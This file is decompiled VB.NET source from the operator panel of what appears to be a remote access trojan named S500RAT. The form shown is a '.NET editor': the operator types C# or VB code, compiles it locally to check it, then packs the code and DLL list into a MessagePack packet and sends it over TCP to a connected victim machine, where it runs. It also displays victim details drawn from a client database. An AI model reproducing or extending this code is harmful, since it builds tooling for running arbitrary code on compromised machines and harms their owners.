Imports System
Imports System.CodeDom.Compiler
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports FastColoredTextBoxNS
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.CSharp
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My.Resources
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000018 RID: 24
	<DesignerGenerated()>
	Public Partial Class FormDotNetEditor
		Inherits Form

		' Token: 0x06000240 RID: 576 RVA: 0x0001257C File Offset: 0x0001077C
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormDotNetEditor_Load
			AddHandler MyBase.Resize, AddressOf Me.FormDotNetEditor_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x170000FA RID: 250
		' (get) Token: 0x06000243 RID: 579 RVA: 0x00013DBF File Offset: 0x00011FBF
		' (set) Token: 0x06000244 RID: 580 RVA: 0x00013DCC File Offset: 0x00011FCC
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170000FB RID: 251
		' (get) Token: 0x06000245 RID: 581 RVA: 0x00013E0F File Offset: 0x0001200F
		' (set) Token: 0x06000246 RID: 582 RVA: 0x00013E19 File Offset: 0x00012019
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x170000FC RID: 252
		' (get) Token: 0x06000247 RID: 583 RVA: 0x00013E22 File Offset: 0x00012022
		' (set) Token: 0x06000248 RID: 584 RVA: 0x00013E2C File Offset: 0x0001202C
		Private Overridable Property ClientInfo As Label

		' Token: 0x170000FD RID: 253
		' (get) Token: 0x06000249 RID: 585 RVA: 0x00013E35 File Offset: 0x00012035
		' (set) Token: 0x0600024A RID: 586 RVA: 0x00013E3F File Offset: 0x0001203F
		Friend Overridable Property ListReferences As Guna2DataGridView

		' Token: 0x170000FE RID: 254
		' (get) Token: 0x0600024B RID: 587 RVA: 0x00013E48 File Offset: 0x00012048
		' (set) Token: 0x0600024C RID: 588 RVA: 0x00013E54 File Offset: 0x00012054
		Friend Overridable Property TextBox1 As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._TextBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.TextBox1_IconRightClick
				Dim value3 As EventHandler = AddressOf Me.TextBox1_IconLeftClick
				Dim textBox As Guna2TextBox = Me._TextBox1
				If textBox IsNot Nothing Then
					RemoveHandler textBox.IconRightClick, value2
					RemoveHandler textBox.IconLeftClick, value3
				End If
				Me._TextBox1 = value
				textBox = Me._TextBox1
				If textBox IsNot Nothing Then
					AddHandler textBox.IconRightClick, value2
					AddHandler textBox.IconLeftClick, value3
				End If
			End Set
		End Property

		' Token: 0x170000FF RID: 255
		' (get) Token: 0x0600024D RID: 589 RVA: 0x00013EB2 File Offset: 0x000120B2
		' (set) Token: 0x0600024E RID: 590 RVA: 0x00013EBC File Offset: 0x000120BC
		Friend Overridable Property Execute As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Execute
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Execute_Click
				Dim execute As Guna2GradientButton = Me._Execute
				If execute IsNot Nothing Then
					RemoveHandler execute.Click, value2
				End If
				Me._Execute = value
				execute = Me._Execute
				If execute IsNot Nothing Then
					AddHandler execute.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000100 RID: 256
		' (get) Token: 0x0600024F RID: 591 RVA: 0x00013EFF File Offset: 0x000120FF
		' (set) Token: 0x06000250 RID: 592 RVA: 0x00013F09 File Offset: 0x00012109
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x17000101 RID: 257
		' (get) Token: 0x06000251 RID: 593 RVA: 0x00013F12 File Offset: 0x00012112
		' (set) Token: 0x06000252 RID: 594 RVA: 0x00013F1C File Offset: 0x0001211C
		Friend Overridable Property StateDotNET As LinkLabel
			<CompilerGenerated()>
			Get
				Return Me._StateDotNET
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As LinkLabel)
				Dim value2 As LinkLabelLinkClickedEventHandler = AddressOf Me.StateDotNET_LinkClicked
				Dim stateDotNET As LinkLabel = Me._StateDotNET
				If stateDotNET IsNot Nothing Then
					RemoveHandler stateDotNET.LinkClicked, value2
				End If
				Me._StateDotNET = value
				stateDotNET = Me._StateDotNET
				If stateDotNET IsNot Nothing Then
					AddHandler stateDotNET.LinkClicked, value2
				End If
			End Set
		End Property

		' Token: 0x17000102 RID: 258
		' (get) Token: 0x06000253 RID: 595 RVA: 0x00013F5F File Offset: 0x0001215F
		' (set) Token: 0x06000254 RID: 596 RVA: 0x00013F69 File Offset: 0x00012169
		Friend Overridable Property Column3 As DataGridViewImageColumn

		' Token: 0x17000103 RID: 259
		' (get) Token: 0x06000255 RID: 597 RVA: 0x00013F72 File Offset: 0x00012172
		' (set) Token: 0x06000256 RID: 598 RVA: 0x00013F7C File Offset: 0x0001217C
		Friend Overridable Property Column4 As DataGridViewTextBoxColumn

		' Token: 0x17000104 RID: 260
		' (get) Token: 0x06000257 RID: 599 RVA: 0x00013F85 File Offset: 0x00012185
		' (set) Token: 0x06000258 RID: 600 RVA: 0x00013F90 File Offset: 0x00012190
		Friend Overridable Property Scharp As UIRadioButton
			<CompilerGenerated()>
			Get
				Return Me._Scharp
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIRadioButton)
				Dim value2 As EventHandler = AddressOf Me.Scharp_CheckedChanged
				Dim scharp As UIRadioButton = Me._Scharp
				If scharp IsNot Nothing Then
					RemoveHandler scharp.CheckedChanged, value2
				End If
				Me._Scharp = value
				scharp = Me._Scharp
				If scharp IsNot Nothing Then
					AddHandler scharp.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000105 RID: 261
		' (get) Token: 0x06000259 RID: 601 RVA: 0x00013FD3 File Offset: 0x000121D3
		' (set) Token: 0x0600025A RID: 602 RVA: 0x00013FE0 File Offset: 0x000121E0
		Friend Overridable Property VbNet As UIRadioButton
			<CompilerGenerated()>
			Get
				Return Me._VbNet
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIRadioButton)
				Dim value2 As EventHandler = AddressOf Me.VbNet_CheckedChanged
				Dim vbNet As UIRadioButton = Me._VbNet
				If vbNet IsNot Nothing Then
					RemoveHandler vbNet.CheckedChanged, value2
				End If
				Me._VbNet = value
				vbNet = Me._VbNet
				If vbNet IsNot Nothing Then
					AddHandler vbNet.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000106 RID: 262
		' (get) Token: 0x0600025B RID: 603 RVA: 0x00014023 File Offset: 0x00012223
		' (set) Token: 0x0600025C RID: 604 RVA: 0x0001402D File Offset: 0x0001222D
		Friend Overridable Property T1 As FastColoredTextBox

		' Token: 0x17000107 RID: 263
		' (get) Token: 0x0600025D RID: 605 RVA: 0x00014036 File Offset: 0x00012236
		' (set) Token: 0x0600025E RID: 606 RVA: 0x00014040 File Offset: 0x00012240
		Friend Overridable Property im As ImageList

		' Token: 0x17000108 RID: 264
		' (get) Token: 0x0600025F RID: 607 RVA: 0x00014049 File Offset: 0x00012249
		' (set) Token: 0x06000260 RID: 608 RVA: 0x00014053 File Offset: 0x00012253
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000109 RID: 265
		' (get) Token: 0x06000261 RID: 609 RVA: 0x0001405C File Offset: 0x0001225C
		' (set) Token: 0x06000262 RID: 610 RVA: 0x00014066 File Offset: 0x00012266
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x1700010A RID: 266
		' (get) Token: 0x06000263 RID: 611 RVA: 0x0001406F File Offset: 0x0001226F
		' (set) Token: 0x06000264 RID: 612 RVA: 0x00014079 File Offset: 0x00012279
		Friend Overridable Property Guna2Elipse1 As Guna2Elipse

		' Token: 0x1700010B RID: 267
		' (get) Token: 0x06000265 RID: 613 RVA: 0x00014082 File Offset: 0x00012282
		' (set) Token: 0x06000266 RID: 614 RVA: 0x0001408C File Offset: 0x0001228C
		Friend Overridable Property Guna2Elipse2 As Guna2Elipse

		' Token: 0x1700010C RID: 268
		' (get) Token: 0x06000267 RID: 615 RVA: 0x00014095 File Offset: 0x00012295
		' (set) Token: 0x06000268 RID: 616 RVA: 0x0001409F File Offset: 0x0001229F
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x1700010D RID: 269
		' (get) Token: 0x06000269 RID: 617 RVA: 0x000140A8 File Offset: 0x000122A8
		' (set) Token: 0x0600026A RID: 618 RVA: 0x000140B2 File Offset: 0x000122B2
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x1700010E RID: 270
		' (get) Token: 0x0600026B RID: 619 RVA: 0x000140BB File Offset: 0x000122BB
		' (set) Token: 0x0600026C RID: 620 RVA: 0x000140C8 File Offset: 0x000122C8
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700010F RID: 271
		' (get) Token: 0x0600026D RID: 621 RVA: 0x0001410B File Offset: 0x0001230B
		' (set) Token: 0x0600026E RID: 622 RVA: 0x00014115 File Offset: 0x00012315
		Public Property Client As Clients

		' Token: 0x17000110 RID: 272
		' (get) Token: 0x0600026F RID: 623 RVA: 0x0001411E File Offset: 0x0001231E
		' (set) Token: 0x06000270 RID: 624 RVA: 0x00014128 File Offset: 0x00012328
		Public Property F As FormS500

		' Token: 0x17000111 RID: 273
		' (get) Token: 0x06000271 RID: 625 RVA: 0x00014131 File Offset: 0x00012331
		' (set) Token: 0x06000272 RID: 626 RVA: 0x0001413B File Offset: 0x0001233B
		Public Property FullPath As String

		' Token: 0x17000112 RID: 274
		' (get) Token: 0x06000273 RID: 627 RVA: 0x00014144 File Offset: 0x00012344
		' (set) Token: 0x06000274 RID: 628 RVA: 0x0001414E File Offset: 0x0001234E
		Friend Property ParentClient As Clients

		' Token: 0x06000275 RID: 629 RVA: 0x00014158 File Offset: 0x00012358
		Private Sub FormDotNetEditor_Load(sender As Object, e As EventArgs)
			Me.ListReferences.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListReferences.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListReferences.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListReferences.AlternatingRowsDefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListReferences.DefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListReferences.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListReferences.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
			Me.ListReferences.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
			Me.ListReferences.CellBorderStyle = DataGridViewCellBorderStyle.None
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Try
				Me.References()
			Catch ex2 As Exception
			End Try
			Me.Scharp.Checked = True
		End Sub

		' Token: 0x06000276 RID: 630 RVA: 0x0001437C File Offset: 0x0001257C
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x06000277 RID: 631 RVA: 0x000143E8 File Offset: 0x000125E8
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
			End Sub)
			MyBase.Close()
		End Sub

		' Token: 0x06000278 RID: 632 RVA: 0x00014404 File Offset: 0x00012604
		Private Sub Compiler(codeDomProvider As CodeDomProvider, source As String, referencedAssemblies As String())
			Try
				Dim msgPack As MsgPack = New MsgPack()
				Dim compilerOptions As String = "/target:winexe /platform:anycpu /optimize-"
				Dim options As CompilerParameters = New CompilerParameters(referencedAssemblies) With { .GenerateExecutable = True, .GenerateInMemory = True, .CompilerOptions = compilerOptions, .TreatWarningsAsErrors = False, .IncludeDebugInformation = False }
				Dim compilerResults As CompilerResults = codeDomProvider.CompileAssemblyFromSource(options, New String() { source })
				Dim flag As Boolean = compilerResults.Errors.Count > 0
				If flag Then
					Try
						Dim enumerator As IEnumerator = compilerResults.Errors.GetEnumerator()
						If enumerator.MoveNext() Then
							Dim compilerError As CompilerError = CType(enumerator.Current, CompilerError)
							MessageBox.Show(String.Format("{0} Line : {1}", compilerError.ErrorText, compilerError.Line), "Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
							Me.Execute.Enabled = True
							Me.Scharp.Enabled = True
							Me.VbNet.Enabled = True
							Me.TextBox1.Enabled = True
							Me.T1.Enabled = True
						End If
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				Else
					Dim list As List(Of String) = New List(Of String)()
					Try
						For Each obj As Object In CType(Me.ListReferences.Rows, IEnumerable)
							Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
							Dim flag2 As Boolean = Not dataGridViewRow.IsNewRow
							If flag2 Then
								list.Add(dataGridViewRow.Cells(1).Value.ToString())
							End If
						Next
					Finally
						Dim enumerator2 As IEnumerator
						If TypeOf enumerator2 Is IDisposable Then
							TryCast(enumerator2, IDisposable).Dispose()
						End If
					End Try
					Dim checked As Boolean = Me.VbNet.Checked
					If checked Then
						msgPack.ForcePathObject("Packet").AsString = "vb"
						msgPack.ForcePathObject("Code").AsString = Me.T1.Text
						msgPack.ForcePathObject("Dll").AsString = String.Join(",", list)
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Else
						msgPack.ForcePathObject("Packet").AsString = "c#"
						msgPack.ForcePathObject("Code").AsString = Me.T1.Text
						msgPack.ForcePathObject("Dll").AsString = String.Join(",", list)
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					End If
				End If
			Catch ex As Exception
				MessageBox.Show(ex.Message, "Erorr !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
				Me.Execute.Enabled = True
				Me.Scharp.Enabled = True
				Me.VbNet.Enabled = True
				Me.TextBox1.Enabled = True
				Me.T1.Enabled = True
			Finally
			End Try
		End Sub

		' Token: 0x06000279 RID: 633 RVA: 0x00014778 File Offset: 0x00012978
		Private Sub References()
			Try
				Dim text As String = Conversions.ToString("System.dll*System.Windows.Forms.dll*Microsoft.VisualBasic.dll*System.Management.dll*System.Drawing.dll")
				Dim array As String() = text.Split(New String() { "*" }, StringSplitOptions.None)
				For Each text2 As String In array
					Dim flag As Boolean = text2.Length > 0
					If flag Then
						Me.ListReferences.Rows.Add(New Object() { Me.im.Images("D.png"), text2 })
					End If
				Next
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600027A RID: 634 RVA: 0x0001482C File Offset: 0x00012A2C
		Private Sub Execute_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.ListReferences.Rows.Count <= 0
				If flag Then
					Me.References()
				End If
			Catch ex As Exception
			End Try
			Try
				Me.Execute.Enabled = False
				Me.Scharp.Enabled = False
				Me.VbNet.Enabled = False
				Me.TextBox1.Enabled = False
				Me.T1.Enabled = False
				Dim providerOptions As Dictionary(Of String, String) = New Dictionary(Of String, String)() From { { "CompilerVersion", "v4.0" } }
				Dim list As List(Of String) = New List(Of String)()
				Try
					For Each obj As Object In CType(Me.ListReferences.Rows, IEnumerable)
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim flag2 As Boolean = Not dataGridViewRow.IsNewRow
						If flag2 Then
							list.Add(dataGridViewRow.Cells(1).Value.ToString())
						End If
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Dim checked As Boolean = Me.VbNet.Checked
				If checked Then
					Me.Compiler(New VBCodeProvider(providerOptions), Me.T1.Text, String.Join(",", list).Split(New String() { "," }, StringSplitOptions.RemoveEmptyEntries))
				Else
					Dim checked2 As Boolean = Me.Scharp.Checked
					If checked2 Then
						Me.Compiler(New CSharpCodeProvider(providerOptions), Me.T1.Text, String.Join(",", list).Split(New String() { "," }, StringSplitOptions.RemoveEmptyEntries))
					End If
				End If
			Catch ex2 As Exception
				Me.Execute.Enabled = True
				Me.Scharp.Enabled = True
				Me.VbNet.Enabled = True
				Me.TextBox1.Enabled = True
				Me.T1.Enabled = True
			End Try
		End Sub

		' Token: 0x0600027B RID: 635 RVA: 0x00014A74 File Offset: 0x00012C74
		Private Sub TextBox1_IconRightClick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.TextBox1.Text, Nothing, False) = 0
				If flag Then
					MessageBox.Show("Please add dll library name", "Dot Net Editor!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				Else
					Dim flag2 As Boolean = Not Me.TextBox1.Text.Contains(".dll")
					If flag2 Then
						MessageBox.Show("Please add dll library name!", "Dot Net Editor!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
					Else
						Me.ListReferences.Rows.Add(New Object() { Me.im.Images("D.png"), Me.TextBox1.Text })
						Me.TextBox1.Clear()
					End If
				End If
			Catch ex As Exception
				MessageBox.Show(ex.Message, "Dot Net Editor!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x0600027C RID: 636 RVA: 0x00014B6C File Offset: 0x00012D6C
		Private Sub TextBox1_IconLeftClick(sender As Object, e As EventArgs)
			Try
				Try
					For Each obj As Object In Me.ListReferences.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Me.ListReferences.Rows.Remove(dataGridViewRow)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			Catch ex As Exception
				MessageBox.Show(ex.Message, "Dot Net Editor!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x0600027D RID: 637 RVA: 0x00014C14 File Offset: 0x00012E14
		Private Sub Scharp_CheckedChanged(sender As Object, e As EventArgs)
			Me.T1.Language = Language.CSharp
			Me.T1.Text = Resources.DotNETc_
		End Sub

		' Token: 0x0600027E RID: 638 RVA: 0x00014C35 File Offset: 0x00012E35
		Private Sub VbNet_CheckedChanged(sender As Object, e As EventArgs)
			Me.T1.Language = Language.VB
			Me.T1.Text = Resources.DotNETvb
		End Sub

		' Token: 0x0600027F RID: 639 RVA: 0x00014C56 File Offset: 0x00012E56
		Private Sub StateDotNET_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs)
			Me.StateDotNET.LinkColor = Color.White
			Me.StateDotNET.Text = ""
		End Sub

		' Token: 0x06000280 RID: 640 RVA: 0x00014C7C File Offset: 0x00012E7C
		Private Sub FormDotNetEditor_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x04000122 RID: 290
		Private FormSize As Boolean
	End Class
End Namespace
